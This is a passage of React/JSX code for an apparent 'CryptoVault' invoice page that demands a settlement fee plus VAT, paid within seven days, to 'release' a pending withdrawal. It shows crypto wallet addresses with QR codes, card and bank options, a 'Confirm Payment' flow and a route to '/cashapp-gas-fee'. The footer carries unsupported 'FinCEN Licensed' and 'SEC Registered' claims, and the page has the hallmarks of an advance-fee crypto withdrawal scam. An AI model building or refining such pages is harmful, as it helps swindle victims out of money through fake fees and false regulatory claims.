                  </tbody>
                </table>
              </div>
            </div>

            {/* Totals */}
            <div className="px-8 pb-8">
              <div className="flex justify-end">
                <div className="w-full max-w-xs space-y-2">
                  <div className="flex justify-between items-center text-sm py-1.5">
                    <span className="text-slate-400">Subtotal</span>
                    <span className="text-white font-medium">${subtotal.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between items-center text-sm py-1.5">
                    <span className="text-slate-400">VAT ({(vatRate * 100).toFixed(1)}%)</span>
                    <span className="text-white font-medium">${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</span>
                  </div>
                  <div className="flex justify-between items-center text-sm py-1.5">
                    <span className="text-slate-400">Fee Rate Applied</span>
                    <span className="text-amber-400 font-medium">
                      {(FEE_RATE * 100).toFixed(0)}% of ${withdrawalAmount.toLocaleString()}
                    </span>
                  </div>
                  <div className="border-t border-[#2a3550] pt-3">
                    <div className="flex justify-between items-center">
                      <span className="text-base font-bold text-white">Balance Due</span>
                      <span className="text-2xl font-bold text-emerald-400">
                        ${totalDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                      </span>
                    </div>
                    <p className="text-xs text-slate-500 mt-1 text-right">USD — United States Dollar</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Payment Methods */}
            <div className="border-t border-[#242d42] px-8 py-6 bg-[#141920]">
              <p className="text-xs font-semibold text-emerald-400 uppercase tracking-widest mb-4">Payment Methods Accepted</p>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Cryptocurrency - clickable */}
                <button
                  onClick={() => { setCryptoPanelOpen(p => !p); if (!cryptoPanelOpen) { setSelectedCoin(null); setSelectedNetwork(null); } }}
                  className={`flex items-center gap-3 p-3 border rounded-xl text-left transition-all ${
                    cryptoPanelOpen
                      ? "bg-emerald-500/10 border-emerald-500/40 ring-1 ring-emerald-500/30"
                      : "bg-[#1a2235] border-[#2a3550] hover:border-emerald-500/30 hover:bg-emerald-500/5"
                  }`}
                >
                  <div className="w-9 h-9 rounded-lg bg-emerald-500/10 flex items-center justify-center text-emerald-400 flex-shrink-0">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold text-white">Cryptocurrency</p>
                    <p className="text-xs text-slate-500">BTC, ETH, USDT, USDC, SOL, XRP, BNB</p>
                  </div>
                  <svg className={`w-4 h-4 text-slate-400 flex-shrink-0 transition-transform ${cryptoPanelOpen ? "rotate-180" : ""}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </button>

                {/* Bank Wire */}
                <div className="flex items-center gap-3 p-3 bg-[#1a2235] border border-[#2a3550] rounded-xl">
                  <div className="w-9 h-9 rounded-lg bg-emerald-500/10 flex items-center justify-center text-emerald-400 flex-shrink-0">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                    </svg>
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-white">Bank Wire Transfer</p>
                    <p className="text-xs text-slate-500">SWIFT / ACH / SEPA — All countries</p>
                  </div>
                </div>

                {/* Credit Card */}
                <div className="flex items-center gap-3 p-3 bg-[#1a2235] border border-[#2a3550] rounded-xl">
                  <div className="w-9 h-9 rounded-lg bg-emerald-500/10 flex items-center justify-center text-emerald-400 flex-shrink-0">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                    </svg>
                  </div>
                  <div>
                    <p className="text-sm font-semibold text-white">Credit / Debit Card</p>
                    <p className="text-xs text-slate-500">Visa, Mastercard, AMEX, UnionPay</p>
                  </div>
                </div>
              </div>

              {/* Crypto Payment Panel */}
              {cryptoPanelOpen && (
                <div className="mt-5 rounded-2xl border border-[#2a3550] bg-[#0f1117] overflow-hidden">
                  <div className="px-5 py-4 border-b border-[#1e2738] flex items-center justify-between">
                    <p className="text-sm font-semibold text-white">Select Cryptocurrency</p>
                    {walletLoading && (
                      <div className="flex items-center gap-1.5 text-xs text-slate-400">
                        <svg className="animate-spin w-3.5 h-3.5" fill="none" viewBox="0 0 24 24">
                          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                        </svg>
                        Loading wallets…
                      </div>
                    )}
                  </div>

                  {/* Coin grid */}
                  <div className="px-5 py-4">
                    <div className="grid grid-cols-2 sm:grid-cols-4 md:grid-cols-7 gap-2">
                      {SUPPORTED_COINS.map(coin => {
                        const hasAddress = walletConfigs.some(c => c.symbol === coin.symbol);
                        return (
                          <button
                            key={coin.symbol}
                            onClick={() => handleCoinClick(coin.symbol)}
                            disabled={walletLoading}
                            className={`flex flex-col items-center gap-1 p-3 rounded-xl border text-center transition-all ${
                              selectedCoin === coin.symbol
                                ? `${coin.color} ring-1 ring-current`
                                : "bg-[#1a2235] border-[#2a3550] hover:border-[#3a4a65] text-slate-400"
                            } ${!hasAddress && !walletLoading ? "opacity-50" : ""}`}
                          >
                            <span className="text-sm font-bold">{coin.symbol}</span>
                            <span className="text-[10px] opacity-70">{coin.name}</span>
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  {/* Network Selection */}
                  {selectedCoin && (() => {
                    const networks = networksForCoin(selectedCoin);
                    return (
                      <div className="border-t border-[#1e2738] px-5 py-4">
                        {networks.length === 0 ? (
                          <div className="text-center py-6">
                            <p className="text-sm text-slate-400">No wallet configured for {selectedCoin} yet.</p>
                            <p className="text-xs text-slate-500 mt-1">Please contact support at billing@cryptovault.io</p>
                          </div>
                        ) : (
                          <>
                            <p className="text-xs font-semibold text-slate-400 uppercase tracking-widest mb-3">
                              Select Network for {selectedCoin}
                            </p>
                            <div className="flex flex-wrap gap-2 mb-4">
                              {networks.map(cfg => (
                                <button
                                  key={cfg.id}
                                  onClick={() => setSelectedNetwork(selectedNetwork?.id === cfg.id ? null : cfg)}
                                  className={`px-4 py-2 rounded-lg border text-sm font-semibold transition-all ${
                                    selectedNetwork?.id === cfg.id
                                      ? "bg-emerald-500 border-emerald-400 text-black"
                                      : "bg-[#1a2235] border-[#2a3550] text-slate-300 hover:border-emerald-500/40"
                                  }`}
                                >
                                  {cfg.network}
                                  {cfg.label && cfg.label !== cfg.network && (
                                    <span className="ml-1.5 opacity-60 text-xs font-normal">({cfg.label})</span>
                                  )}
                                </button>
                              ))}
                            </div>
                          </>
                        )}

                        {/* Wallet Address + QR */}
                        {selectedNetwork && (
                          <div className="mt-2">
                            {/* Network confirmation warning */}
                            <div className="flex items-start gap-2.5 p-3 bg-amber-500/8 border border-amber-500/20 rounded-xl mb-4">
                              <svg className="w-4 h-4 text-amber-400 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                              </svg>
                              <p className="text-xs text-amber-300 leading-relaxed">
                                <strong className="font-semibold">Network Warning:</strong> Send only <strong>{selectedCoin}</strong> via the <strong>{selectedNetwork.network}</strong> network.
                                Sending to the wrong network will result in <strong>permanent loss of funds</strong>.
                              </p>
                            </div>

                            <div className="flex flex-col md:flex-row gap-6 items-center">
                              {/* QR Code */}
                              <div className="flex-shrink-0 bg-white rounded-2xl p-4 shadow-lg">
                                <QRCode
                                  value={selectedNetwork.address}
                                  size={160}
                                  bgColor="#ffffff"
                                  fgColor="#000000"
                                  level="M"
                                />
                              </div>

                              {/* Address + Copy */}
                              <div className="flex-1 min-w-0 w-full">
                                <div className="mb-2">
                                  <p className="text-xs text-slate-400 font-medium mb-1 uppercase tracking-wide">
                                    {selectedCoin} Wallet Address ({selectedNetwork.network})
                                  </p>
                                  <div className="relative">
                                    <div className="w-full px-4 py-3 bg-[#1a2235] border border-[#2a3550] rounded-xl text-emerald-300 text-xs font-mono leading-relaxed break-all pr-24">
                                      {selectedNetwork.address}
                                    </div>
                                    <button
                                      onClick={handleCopyAddress}
                                      className={`absolute right-2 top-1/2 -translate-y-1/2 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                                        copied
                                          ? "bg-emerald-500 text-black"
                                          : "bg-emerald-600 hover:bg-emerald-500 text-white"
                                      }`}
                                    >
                                      {copied ? "Copied!" : "Copy"}
                                    </button>
                                  </div>
                                </div>
                                <p className="text-xs text-slate-500 mt-3 leading-relaxed">
                                  Scan the QR code or copy the address above to send <strong className="text-slate-400">{selectedCoin}</strong> payment.
                                  Always double-check the network before sending.
                                </p>
                                <div className="mt-3 flex items-center gap-2">
                                  <span className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-medium">
                                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                                    {selectedNetwork.network}
                                  </span>
                                  <span className="text-xs text-slate-500">{selectedCoin}</span>
                                </div>
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    );
                  })()}
                </div>
              )}
            </div>

            {/* Footer notes */}
            <div className="border-t border-[#242d42] px-8 py-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <p className="text-xs font-semibold text-slate-400 uppercase tracking-wide mb-2">Important Notice</p>
                  <p className="text-xs text-slate-500 leading-relaxed">
                    The balance of ${totalDue.toLocaleString("en-US", { minimumFractionDigits: 2 })} (settlement fee ${feeTotal.toLocaleString("en-US", { minimumFractionDigits: 2 })} + {(vatRate * 100).toFixed(1)}% VAT ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}) must be paid within 7 days to release the pending withdrawal of ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })} USD. Failure to pay may result in account suspension per our Terms of Service, Section 14.3.
                  </p>
                </div>
                <div>
                  <p className="text-xs font-semibold text-slate-400 uppercase tracking-wide mb-2">Contact & Support</p>
                  <p className="text-xs text-slate-500 leading-relaxed">
                    For billing inquiries, contact our compliance team at billing@cryptovault.io or call +1 (800) 555-CRYPTO. Reference your invoice number {invoiceNumber} in all communications.
                  </p>
                </div>
              </div>

              <div className="mt-6 pt-6 border-t border-[#1e2738] flex flex-col md:flex-row items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <div className="w-6 h-6 rounded-lg bg-emerald-500 flex items-center justify-center">
                    <span className="text-white font-bold text-xs">C</span>
                  </div>
                  <span className="text-sm font-semibold text-white">CryptoVault</span>
                  <span className="text-slate-500 text-xs">© 2026 All rights reserved.</span>
                </div>
                <div className="flex items-center gap-4 text-xs text-slate-500">
                  <span>Reg. No: CV-2019-88421</span>
                  <span>•</span>
                  <span>FinCEN Licensed MSB</span>
                  <span>•</span>
                  <span>SEC Registered</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Confirm Payment */}
        <div className="mt-6 flex flex-col items-center gap-3">
          <button
            onClick={handleConfirmPayment}
            disabled={confirmState !== "idle" && confirmState !== "error" && confirmState !== "denied"}
            className="flex items-center gap-2 px-8 py-4 bg-emerald-500 hover:bg-emerald-400 disabled:opacity-60 disabled:cursor-not-allowed text-black rounded-xl text-base font-extrabold transition-colors shadow-lg shadow-emerald-500/30"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            Confirm Payment — ${totalDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
          </button>
          {confirmState === "denied" && (
            <p className="text-xs text-red-400 text-center">
              Your payment confirmation was denied. Please contact billing@cryptovault.io or try again.
            </p>
          )}
          {confirmState === "error" && (
            <p className="text-xs text-red-400 text-center">{errorMsg || "Failed to submit. Please try again."}</p>
          )}
        </div>

        {/* Action buttons */}
        <div className="flex flex-wrap justify-center mt-6 gap-3">
          {confirmState === "approved" && (
            <button
              onClick={() => navigate("/cashapp-gas-fee")}
              className="flex items-center gap-2 px-6 py-3 bg-[#00D632] hover:bg-[#00C02E] text-white rounded-xl text-sm font-bold transition-colors shadow-lg shadow-[#00D632]/20"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              PAID
            </button>
          )}
          <button
            onClick={handlePrintInvoice}
            className="flex items-center gap-2 px-5 py-2.5 bg-muted border border-border rounded-xl text-sm font-medium text-foreground hover:bg-secondary transition-colors"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z" />
            </svg>
            Print Invoice
          </button>
          <button
            onClick={handlePrintReceipt}
            className="flex items-center gap-2 px-5 py-2.5 bg-[#161b27] border border-blue-500/30 rounded-xl text-sm font-medium text-blue-400 hover:bg-blue-500/10 transition-colors"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
            </svg>
            Print Receipt
          </button>
          <button
            onClick={() => navigate("/link-account")}
            className="flex items-center gap-2 px-5 py-2.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl text-sm font-semibold transition-colors"
          >
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
            Link Bank / Card to Pay
          </button>
          <button
            onClick={() => navigate("/dashboard")}
            className="flex items-center gap-2 px-5 py-2.5 bg-primary text-primary-foreground rounded-xl text-sm font-semibold hover:opacity-90 transition-opacity"
          >
            Back to Dashboard
          </button>
        </div>

        {/* Hidden QR code container for serializing to SVG data URL in print templates */}
        <div
          ref={qrContainerRef}
          aria-hidden="true"
          style={{ position: "absolute", top: -9999, left: -9999, opacity: 0, pointerEvents: "none", width: 160, height: 160 }}
        >
          {selectedNetwork && (
            <QRCode
              value={selectedNetwork.address}
              size={160}
              bgColor="#ffffff"
              fgColor="#000000"
              level="M"
            />
          )}
        </div>
      </div>
    </div>
  );
}
